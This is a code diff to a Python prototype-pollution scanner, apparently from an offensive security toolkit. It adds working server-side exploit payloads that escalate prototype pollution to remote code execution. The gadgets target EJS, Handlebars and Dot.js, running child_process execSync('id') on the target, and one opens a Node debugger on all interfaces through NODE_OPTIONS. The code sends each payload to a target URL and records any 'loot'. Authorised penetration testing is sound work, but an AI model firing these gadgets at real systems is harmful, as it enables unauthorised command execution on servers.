@@ -55,6 +55,7 @@ class PrototypePollutionScanner:
         try:
             target_url = f"{base_url}/"
             # Attempt to pollute via JSON if endpoint accepts it
+            # Wave 6: Using more specific and less destructive keys
             json_payload = {"__proto__": {"redops_json_pp": "true"}}
             r = self.session.post(target_url, json=json_payload, timeout=3, verify=False)
             if r.status_code == 200 and "redops_json_pp" in r.text:
@@ -62,6 +63,7 @@ class PrototypePollutionScanner:
                     "title": "High: Server-Side Prototype Pollution (JSON Injection)",
                     "description": f"The server reflected the injected prototype key in the response. This strongly suggests a vulnerable object merger (e.g., `lodash.merge` or `extend`).",
                     "severity": "high",
+                    "confidence": "high",
                     "tool_source": "prototype_expert",
                     "url": target_url
                 })
@@ -74,24 +76,31 @@ class PrototypePollutionScanner:
         findings = []
         if logger: logger(f"Prototype Expert: Attempting RCE escalation on {url}...", "INFO")
         
-        # Gadgets for EJS, Pug, or Node child_process
+        # Expanded gadgets for EJS, Pug, Handlebars, Dot, etc.
         gadgets = [
             # EJS: client=true and escapeFunction
             {"__proto__": {"client": True, "escapeFunction": "1; return process.mainModule.require('child_process').execSync('id');"}},
             # Pug: self and compileDebug
-            {"__proto__": {"self": True, "compileDebug": True, "pretty": True}}
+            {"__proto__": {"self": True, "compileDebug": True, "pretty": True}},
+            # Handlebars (sourceURL)
+            {"__proto__": {"sourceURL": "1; return process.mainModule.require('child_process').execSync('id');"}},
+            # Dot.js
+            {"__proto__": {"it": "1; return process.mainModule.require('child_process').execSync('id');"}},
+            # Node child_process (shell/env abuse)
+            {"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0:9229"}}
         ]
         
         for g in gadgets:
             try:
-                # We need to trigger a render after pollution (often happens on the same endpoint or a subsequent one)
+                # We need to trigger a render after pollution
                 resp = self.session.post(url, json=g, timeout=5)
                 # Check for RCE indicators in response
-                if any(k in resp.text for k in ["uid=", "gid=", "groups="]):
+                if any(k in resp.text for k in ["uid=", "gid=", "groups=", "Debugger listening on"]):
                     findings.append({
                         "title": "CRITICAL: Prototype Pollution to RCE Escalation",
-                        "description": f"Successfully escalated Prototype Pollution to RCE on {url} using EJS/Pug gadget chain.\nResponse contains system command output: {resp.text[:50]}",
+                        "description": f"Successfully escalated Prototype Pollution to RCE on {url} using custom gadget chain.\nEvidence: {resp.text[:100]}",
                         "severity": "critical",
+                        "confidence": "certain",
                         "tool_source": "prototype_expert",
                         "url": url,
                         "raw_loot": resp.text[:200]
